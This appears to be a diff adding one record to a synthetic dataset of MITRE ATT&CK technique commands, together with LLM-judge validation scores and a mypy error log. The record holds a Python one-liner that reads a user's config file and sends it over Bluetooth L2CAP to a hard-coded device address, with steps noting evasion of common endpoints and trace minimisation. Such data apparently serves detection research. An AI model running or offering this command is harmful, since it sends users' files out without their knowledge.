@@ -1,0 +1,59 @@
+{
+  "technique_id": "T1011",
+  "platform": "Linux",
+  "shell": "Python",
+  "command": "python3 -c \"import socket,os; s=socket.socket(socket.AF_BLUETOOTH, socket.SOCK_SEQPACKET, socket.BTPROTO_L2CAP); s.settimeout(6); s.connect(('38:18:4C:AA:BB:CC', 0x1001)); p=os.path.expanduser('~/.config/user-dirs.dirs'); s.sendall(open(p,'rb').read()); s.close()\"",
+  "explanation": "Exfiltrates via Bluetooth L2CAP on a dynamic PSM (0x1001), using a medium distinct from the primary communication channel in line with T1011.",
+  "rationale_steps": [
+    "Select Bluetooth L2CAP to leverage a non-IP transport path.",
+    "Connect to a dynamic PSM (0x1001) to avoid common service endpoints.",
+    "Read a user config file and send its raw bytes via L2CAP.",
+    "Close the socket promptly to minimize traces."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-PYTHON-T1011-2e02ce6e-3ac447bb",
+  "source_prompt_hash": "2e02ce6e",
+  "timestamp_utc": "2025-09-30T08:40:28.862749Z",
+  "validation": {
+    "syntax_ok": false,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "The Python one-liner is well-formed with balanced quotes/parentheses, valid socket constants, and proper statement separation via semicolons.",
+        "semantic_score": 4,
+        "semantic_justification": "It reads a local file and sends its contents over a Bluetooth L2CAP socket to a specified MAC/PSM, matching T1011, though success depends on a reachable listening service and appropriate Bluetooth permissions/pairing.",
+        "combined_score": 4.5,
+        "confidence": 0.8,
+        "timestamp": "2025-10-01T01:30:33.540150Z"
+      },
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The Python command is perfectly well-formed with balanced quotes, parentheses, and proper syntax for importing modules, creating a socket, setting parameters, and performing file operations.",
+        "semantic_score": 5,
+        "semantic_justification": "The command fully implements T1011 by establishing a Bluetooth L2CAP connection to exfiltrate the contents of the user-dirs.dirs configuration file over a separate network medium (Bluetooth) from the primary command and control channel.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2025-10-01T01:30:36.825430Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The Python command is perfectly well-formed with balanced quotes and parentheses, valid function calls, and proper statement separators.",
+        "semantic_score": 5,
+        "semantic_justification": "The command perfectly aligns with T1011 by programmatically establishing a Bluetooth L2CAP connection to a distinct medium and exfiltrating a user-specific file, which is operationally plausible.",
+        "combined_score": 5.0,
+        "confidence": 1,
+        "timestamp": "2025-10-01T06:32:41.917354Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 4.667,
+    "llm_average_score": 4.833,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null,
+    "Syntax_Run_Details": "mypy issues:\nC:\\Users\\flacman\\AppData\\Local\\Temp\\tmpc5b4wutj.py:1: error: Module has no attribute \"BTPROTO_L2CAP\"  [attr-defined]\nFound 1 error in 1 file (checked 1 source file)"
+  }
+}
